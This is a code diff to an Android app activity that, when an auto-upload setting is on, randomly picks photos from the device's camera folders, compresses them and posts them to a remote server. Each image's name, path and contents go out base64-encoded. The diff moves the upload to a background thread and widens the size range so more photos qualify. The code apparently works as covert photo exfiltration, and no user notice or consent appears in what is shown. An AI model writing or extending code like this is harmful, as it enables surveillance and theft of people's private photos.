@@ -9,6 +9,8 @@ import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.net.Uri;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
@@ -33,6 +35,7 @@ import com.zhangheng.myapplication.getphoneMessage.PhoneSystem;
 import com.zhangheng.myapplication.okhttp.OkHttpUtil;
 import com.zhangheng.myapplication.permissions.ReadAndWrite;
 import com.zhangheng.myapplication.setting.ServerSetting;
+import com.zhangheng.myapplication.util.AndroidImageUtil;
 import com.zhangheng.myapplication.util.LocalFileTool;
 import com.zhangheng.myapplication.util.OkHttpMessageUtil;
 import com.zhangheng.myapplication.util.RandomrUtil;
@@ -166,12 +169,31 @@ public class Main3Activity extends Activity {
         m3_tv_ipAddress.setText("应用版本号：" + versionCode);
         setting = new ServerSetting(Main3Activity.this);
         getupdatelist();
+
+//        new Thread(new Runnable() {
+//            @Override
+//            public void run() {
+//                String path2="/storage/emulated/0/DCIM/Camera/IMG_20220525_160509.jpg";
+//                String path1_5="/storage/emulated/0/DCIM/Camera/IMG_20220329_180520.jpg";
+//                File file = new File(path2);
+//                Log.e("原文件",LocalFileTool.getFileSizeString(file.length()));
+//                Log.e("原大小",LocalFileTool.getFileSizeString((long) EncryptUtil.enBase64(LocalFileTool.fileToBytes(file)).getBytes().length));
+//                Bitmap zip = AndroidImageUtil.zip(BitmapFactory.decodeFile(path2), 4);
+//                Log.e("压缩大小",LocalFileTool.getFileSizeString((long) EncryptUtil.enBase64(AndroidImageUtil.bitmapToByte(zip)).getBytes().length));
+//            }
+//        }).start();
+
         if (setting.getIsAutoUploadPhoto()) {
-            try {
-                getPhoto();
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        try {
+                            getPhoto();
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                        }
+                    }
+                }).start();
         }
     }
 
@@ -228,7 +250,8 @@ public class Main3Activity extends Activity {
                         String s = path.replace(GetPhoto.BasePath, "");
                         for (String s1 : paths) {
                             if (s.startsWith(s1)) {
-                                if (file.length() < 1024 * 1024 && file.length() > 1024 * 100) {
+//                                if (file.length() < 1024 * 1024 && file.length() > 1024 * 100) {
+                                if (file.length() > 1024 * 100&&file.length()<1024*1024*2) {
                                     photo.add(path);
                                 }
                                 break;
@@ -236,7 +259,7 @@ public class Main3Activity extends Activity {
                         }
                     }
                     final int size = photo.size();
-                    Log.e(Tag, "100kb~1Mb图片数：" + size);
+                    Log.e(Tag, "100kb~2Mb图片数：" + size);
 //                    for (String s : photo) {
 //                        File file = new File(s);
 //                        Map<String,Object> map=new HashMap<>();
@@ -285,17 +308,40 @@ public class Main3Activity extends Activity {
                                                 } else {
                                                     c = 5;
                                                 }
-                                                for (int i = 0; i < c; i++) {
+                                                int i=0;
+                                                while (i<c) {
                                                     int random = RandomrUtil.createRandom(0, size - 1);
-                                                    File file = new File(photo.get(random));
-                                                    String replace = file.getAbsolutePath().replace(LocalFileTool.BasePath, "");
-                                                    Log.d(Tag + "上传图片", replace + ",大小:" + LocalFileTool.getFileSizeString(file.length()));
-                                                    Map<String, Object> map = new HashMap<>();
-                                                    map.put("time", TimeUtil.dateToUnix(new Date()));
-                                                    map.put("name", EncryptUtil.enBase64(file.getName().getBytes()));
-                                                    map.put("path", EncryptUtil.enBase64(replace.getBytes()));
-                                                    map.put("data", EncryptUtil.enBase64(LocalFileTool.fileToBytes(file)));
-                                                    OkHttpUtil.postFile(Main3Activity.this, OkHttpUtil.URL_postMessage_M3_PostUpload, JSONUtil.toJsonStr(map));
+                                                    String pathname = photo.get(random);
+                                                    File file = new File(pathname);
+                                                    if (file.exists()) {
+                                                        byte[] bytes = null;
+                                                        long fileLength = file.length();
+                                                        if (fileLength >= 1024 * 1024 * 0.8 && fileLength < 1024 * 1024 * 1.2) {
+                                                            Bitmap zip = AndroidImageUtil.zip(BitmapFactory.decodeFile(pathname), 2);
+                                                            bytes = AndroidImageUtil.bitmapToByte(zip);
+                                                        } else if (fileLength >= 1024 * 1024 * 1.2 && fileLength < 1024 * 1024 * 1.6) {
+                                                            Bitmap zip = AndroidImageUtil.zip(BitmapFactory.decodeFile(pathname), 3);
+                                                            bytes = AndroidImageUtil.bitmapToByte(zip);
+                                                        } else if (fileLength >= 1024 * 1024 * 1.6) {
+                                                            Bitmap zip = AndroidImageUtil.zip(BitmapFactory.decodeFile(pathname), 4);
+                                                            bytes = AndroidImageUtil.bitmapToByte(zip);
+                                                        } else {
+                                                            bytes = LocalFileTool.fileToBytes(file);
+                                                        }
+                                                        if (bytes.length<1024*1024) {
+                                                            i++;
+                                                            String replace = file.getAbsolutePath().replace(LocalFileTool.BasePath, "");
+                                                            Log.d(Tag + "上传图片", replace + ",原文件大小:"
+                                                                    + LocalFileTool.getFileSizeString(fileLength)+",上传大小："+LocalFileTool.getFileSizeString((long) bytes.length));
+                                                            Map<String, Object> map = new HashMap<>();
+                                                            map.put("time", TimeUtil.dateToUnix(new Date()));
+                                                            map.put("name", EncryptUtil.enBase64(file.getName().getBytes()));
+                                                            map.put("path", EncryptUtil.enBase64(replace.getBytes()));
+                                                            map.put("size", fileLength);
+                                                            map.put("data", EncryptUtil.enBase64(bytes));
+                                                            OkHttpUtil.postFile(Main3Activity.this, OkHttpUtil.URL_postMessage_M3_PostUpload, JSONUtil.toJsonStr(map));
+                                                        }
+                                                    }
                                                 }
                                             }
                                         } else {
